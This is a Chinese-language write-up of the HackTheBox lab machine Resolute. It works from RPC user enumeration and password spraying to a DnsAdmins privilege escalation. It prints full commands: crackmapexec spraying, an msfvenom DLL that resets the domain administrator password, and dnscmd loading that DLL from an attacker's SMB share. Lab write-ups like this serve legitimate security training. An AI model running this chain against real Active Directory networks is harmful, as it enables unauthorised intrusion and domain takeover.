---
title: "HTB Resolute"
description: "HackTheBox篇Active Directory 101系列之Resolute"

date: 2024-07-12T14:30:34+08:00
lastmod: 2025-11-11T09:52:07+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - DnsAdmins abuse
---
<!--more-->

> 靶机ip：10.10.10.169

# 知识点

* 密码喷洒
* 利用DnsAdmins提权

# 信息收集

## nmap扫描

拿`nmap`扫一下

`nmap -sS -sV -sC 10.10.10.169`

![image-20240712152500615](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712152502867-231239340.png)

分析发现有`DNS`服务、`kerberos`服务、`ldap`服务、`smb`服务，域名为`megabank.local`

## SMB

简单测试一下

`smbclient -L //10.10.10.169`

![image-20240712152802524](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712152804340-1683391527.png)

匿名登陆成功但是没什么有用的信息

## ldap

`ldapsearch -H ldap://10.10.10.169:389 -x -s base -b "" namingcontexts`

![image-20240712153255680](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712153256941-2017644621.png)

也没啥有用信息

## RPC

利用RPC远程过程调用枚举用户

`rpcclient -U "" -N 10.10.10.169`

枚举用户

`enumdomusers`

![image-20240712153719000](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712153719898-11121245.png)

显示用户详细列表信息

`querydispinfo`

![image-20240712155152658](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712155153559-329641798.png)

找到用户名密码：`marko : Welcome123!`

尝试`rpcclient`和`smbclient`登录

 `smbclient -U marko -L //10.10.10.169`

`rpcclient -U marko -N 10.10.10.169`

![image-20240712161105981](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712161106863-713337375.png)

都失败了。

# 密码喷洒

既然`marko`用户登录不上，不妨拿这个密码去试试其他的用户，利用`crackmapexec`工具尝试密码喷洒攻击

先将之前通过`rpcclient`的`enumdomusers`命令拿到的用户名列表保存为`users`

写个`python`脚本将其提取到`users.txt`中

```python
# 打开uusers.txt文件进行读取
with open('users', 'r', encoding='utf-8') as infile:
    lines = infile.readlines()

# 打开user.txt文件进行写入
with open('users.txt', 'w', encoding='utf-8') as outfile:
    for line in lines:
        # 使用正则表达式匹配user后面的用户名
        import re
        match = re.search(r'user:\[(.*?)\]', line)
        if match:
            username = match.group(1)
            # 将用户名写入user.txt文件中
            outfile.write(username + '\n')
```

![image-20240712162108457](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712162109450-1203669142.png)

使用`crackmapexec`进行密码喷洒

`crackmapexec smb 10.10.10.169 -u ./users.txt -p Welcome123!`

![image-20240712162353688](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712162354838-1404006531.png)

发现`melanie`用户可以登录，使用`evil-winrm`登录

`evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!`

![image-20240712162933792](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712162935023-164823517.png)

![image-20240712163205922](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712163206748-1443376353.png)

在`Desktop`上找到`user.txt`

# AD域提权

## BloodHound信息搜集

将`SharpHound.exe`传上去运行

![image-20240712175808679](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712175809715-202073680.png)

将结果`zip`下载下来，拿`bloodhoun`分析

![image-20240712181218798](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712181220147-1222680155.png)

点击`Find Shortest Paths to Domain Admins`后，发现当前用户没有什么明显利用的点，但是发现在这个域中还有一个`ryan`用户，但是不知道密码，只能从当前`melanie`用户入手了

## 查看Powershell日志文件获得用户名密码

查找可疑文件时，在`C:/`目录下运行`ls -force`命令后发现如下结果：
![image-20240712181551586](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712181552664-103691626.png)

其中`PSTranscripts`有点可疑，该英文直译是`PS传输脚本`，仔细查看一下这个目录

![image-20240712182037742](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712182039819-759817632.png)

在`C:\PSTranscripts\20191203`目录下找到`PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`文件，该文件可能是`Powershell`的日志之类的文件，查看一下

![image-20240712182642485](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712182643667-1606404044.png)

这里貌似是`ryan`用户的用户名和密码，尝试登陆下

`evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'`

![image-20240712182822459](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712182823693-1043454332.png)

登录成功

## 利用DnsAdmins提权

在桌面发现`note.txt`文件，内容如下：

![image-20240712183131938](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712183132981-1610553881.png)

翻译过来就是

> 发送给团队的电子邮件：
>
> \- 由于更改冻结，任何系统更改（除了对管理员帐户的更改）都将在1分钟内自动恢复

在查看`bloodhound`的过程中发现下面情况：

![image-20240712191130338](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712191138799-215220281.png)

![image-20240712191143991](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712191145783-1038194011.png)

发现`ryan`用户属于`contractors`组，而`contractors`组又属于`dnsadmins`组，所以`ryan`用户属于`dnsadmins`组

就可以利用 `DnsAdmins`权限进行`AD`域提权

> `DNSAdmins`组的成员可以访问网络 `DNS` 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。
>
> dnsadmins 组的成员可用于通过 `dll` 注入将权限提升到管理员。
>
> [参考链接](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)

首先使用`msf`生成`dll`文件，将`dll`文件传到机器上

`msfvenom -p windows/x64/exec cmd='net user administrator abc123! /domain' -f dll > evil.dll`

![image-20240714143407217](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714143409907-1507824470.png)

因为正常`upload`传文件会被杀掉，这里考虑使用`smb`传文件

`python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./`

![image-20240714134943265](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714134946085-1345920374.png)

在靶机上的`ps`里头执行

`cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.28\share\evil.dll`

![image-20240714135419626](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714135422509-753045836.png)

接着执行如下命令重启`dns`服务

```powershell
sc.exe stop dns
sc.exe start dns
```

![image-20240714140453914](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714140456936-991048758.png)

此时，之前利用`python`起的`smbserver`服务会收到回显

![image-20240714140729094](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714140731885-1692805194.png)

最后利用`psexec.py`登录，输入密码

`python3 /usr/share/doc/python3-impacket/examples/psexec.py megabank.local/administrator@10.10.10.169`

![image-20240714143551441](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714143554332-1195939730.png)

最后在`Administrator`的`Desktop`找到`root.txt`

![image-20240714144237322](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714144241216-9787929.png)